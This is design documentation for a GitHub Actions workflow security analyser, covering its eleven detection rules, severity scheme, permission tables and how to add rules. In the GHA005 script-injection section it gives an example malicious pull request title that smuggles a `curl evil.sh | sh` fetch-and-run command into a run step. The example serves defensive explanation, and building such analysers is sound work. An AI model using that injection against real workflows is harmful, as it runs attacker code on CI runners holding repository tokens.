# Detection rules

Eleven deterministic rules, plus one finding reported against the acceptance
mechanism itself. Each rule is a class implementing
`IWorkflowSecurityRule`, registered in the API's composition root and discovered
by injecting `IEnumerable<IWorkflowSecurityRule>`. Adding one is a new class and
one registration line.

| Rule | Detects | Severity | Auto-fix |
| --- | --- | --- | --- |
| GHA001 | Action not pinned to a commit SHA | High | Yes, when resolvable |
| GHA002 | Excessive token permissions | By scope: High to Low | `write-all` only |
| GHA003 | Job without a timeout | Low | Yes |
| GHA004 | `pull_request_target` trigger | Critical, or Low when no PR code runs | No |
| GHA005 | Untrusted expression in a script body | Critical | No |
| GHA006 | Checkout persisting the job token | Medium | No |
| GHA007 | Privileged trigger checking out PR code | Critical | No |
| GHA008 | Reusable workflow call inheriting all secrets | High | No |
| GHA009 | No declared token permissions | Medium | No |
| GHA010 | Self-hosted runner on a pull-request trigger | High | No |
| GHA011 | `workflow_run` job consuming an artifact | High | No |

`GHA012` is not in the table because it is not a rule. It is reported by the
analysis service against the acceptance mechanism itself, when a
`sentinel:accept` comment has outlived its finding or states no reason — see
[accepting-findings.md](../accepting-findings.md).

---

## Establishing need

Three of these rules used to report a configuration that was already correct.

`github/codeql-action/analyze` uploads results through the code-scanning API,
which requires `security-events: write`. GHA002 reported that as excessive,
while its own remediation — "grant only the specific write permission required
by the job" — had already been followed. The advice could not be taken without
breaking code scanning, and this repository carried three such grants with
hand-written exemptions in its test suite saying so.

A rule needing an exception for the correct answer is describing something the
rule should know.

**GHA002** holds a table of 24 actions and the scopes each cannot work without.
What an action requires is documented and static, so it is a lookup rather than
an inference, and the rule stays deterministic. Conditional entries carry their
condition: `actions/dependency-review-action` needs `pull-requests: write` only
when `comment-summary-in-pr` asks it to comment.

- A job-scoped grant an action in that job requires — not reported
- A workflow-scoped grant some job requires — Low, "move it to that job", since
  a workflow grant reaches jobs that have no use for it
- A grant nothing requires — reported, at the severity of the scope
- `write-all` — reported whatever the job runs

Severity follows what the scope can do once a token is stolen, instead of being
constant. `contents`, `packages` and `actions` are High: code and artefacts an
attacker can make others run. `security-events`, `checks` and `statuses` are
Low: signal they can suppress but not act through. Everything else is Medium,
including a scope GitHub adds after the table was written.

**GHA004** reported the `pull_request_target` trigger as Critical on its
presence alone. The trigger exists so a workflow can label a fork's pull request
or post a comment — work `pull_request` cannot do, because it has no token worth
using. It is Critical when a job checks out the pull request's head, and Low
otherwise, where the exposure would come from a later edit. GHA007 continues to
name the exact step; both read the untrusted-checkout definition from one place
so they cannot drift.

**GHA006** told a job to remove the credential it pushes with. Its remediation
already said "unless a later step needs to push with the job token" while
nothing established whether one did. It now stays quiet when a script after the
checkout, in the same job, pushes — and only then. Step names are not searched,
because `- name: Set up git push credentials` would otherwise silence a real
credential exposure.

### Suppression is the expensive direction

A missing table entry costs a false positive. A wrong one silently hides a real
finding. The tables are built for the second risk:

- prefix matching stops at the path separator, so `github/codeql-action-mirror`
  cannot borrow `github/codeql-action`'s exemption
- a required scope excuses only itself — `contents: write` beside CodeQL still
  reports
- an unrecognised scope stays Medium rather than falling through unreported
- a reusable-workflow call justifies nothing, since its steps are not visible
- `write-all` is never excused

Every case that goes quiet has a test paired with the neighbouring case that
must still report.

**GHA003** already worked this way and was the model for the others: it skips
jobs that call a reusable workflow, because GitHub rejects `timeout-minutes` on
one — and the finding is auto-fixable, so reporting it would have offered a
patch that breaks the file.

---

## The critical three

**GHA005 — script injection.** GitHub substitutes `${{ }}` into a `run:` body
before the shell sees it, so an expression an attacker controls becomes code. A
pull request titled `a"; curl evil.sh | sh; #` executes on the runner with
whatever token the job holds.

Only contexts an unprivileged third party can set are reported. Expressions in
`if:` and `with:` are **not** reported: those are evaluated by the expression
engine rather than substituted into a shell, and flagging them would trade away
the precision the deterministic-first design depends on.

**GHA004 and GHA007 — the privileged trigger, and the pairing that exploits it.**
`pull_request_target` runs in the base repository's context with secrets and a
writable token. That is safe only while the job never executes the contributor's
code.

GHA004 reports the trigger as needing review. GHA007 fires only when a checkout
also brings the pull request's own head into that context — the pairing that is
actually exploitable rather than merely risky. They are separate rules because
they warrant different responses.

---

## The rest

**GHA001** — a movable tag can resolve to different code later. When
`GitHub:ResolveActionReferences` is enabled the fix resolves the real SHA through
the API; when it cannot, the line is left untouched and a warning explains why,
rather than writing a placeholder that would look remediated.

**GHA002** — write access at workflow or job scope. Read from the parsed
structure, so `permissions: {contents: write}` in flow style is caught and a
`write` value under an unrelated key is not mistaken for a permission.

**GHA003** — a job without `timeout-minutes` runs until the platform limit.

**GHA006** — `actions/checkout` defaults `persist-credentials` to true, writing
the token into `.git/config` where every later step can read it. A compromise
after checkout then inherits repository write access rather than being confined
to the step it started in.

**GHA008** — `secrets: inherit` forwards the entire secret store to a called
workflow, including secrets it has no use for.

**GHA009** — the counterpart to GHA002. That rule reports permissions that are
explicitly too broad; this reports the absence of any statement, where the grant
comes from a repository setting invisible in the workflow.

**GHA010** — self-hosted runners are not disposable. A job that runs
contributor code on one leaves what it did behind for the next.

**GHA011** — `workflow_run` runs privileged and usually collects something a
less-privileged workflow produced. That artifact is contributor-controlled.

---

## Severity

`Critical`, `High`, `Medium`, `Low`. Every level is produced by at least one
rule — an `Informational` level existed and was removed, because a level no rule
emits appears in the client's ordering and in exports as a category that can
never be populated.

Risk scoring weights Critical 10, High 7, Medium 4, Low 2, and risk reduction is
the percentage change between the original and proposed scores.

---

## What a rule may assume

Rules receive a `ParsedWorkflow` with three views:

- `Structure` — jobs, steps, permissions, triggers, with source lines. Use this
  for anything about relationships.
- `Lines` — every line, with `run:` and `script:` bodies **excluded**.
- `ScriptBlocks` — those bodies, kept separately with their line numbers.

The separation is deliberate: treating shell as YAML produced false positives
where a script containing `uses: foo@v1` was reported as an unpinned action, and
the patch generator would have rewritten a line inside a shell script.

A rule that reasons about structure and matches text instead will be wrong in
ways that are hard to see. See
[engineering-log.md](../engineering-log.md#7-rules-matched-text-rather-than-structure).

---

## Adding a rule

1. Implement `IWorkflowSecurityRule` in `Infrastructure/Rules`.
2. Register it in `Program.cs`.
3. Add it to `CreateRules()` in the infrastructure tests.
4. Write tests for the positive case, the negative case, **and the near-miss** —
   the workflow that looks like a violation and is not.
5. Add a bundled scenario if it should be demonstrable in the application.

The near-miss test is the one that matters. Precision is what makes a
deterministic analyser worth trusting, and every false positive spends that
trust.
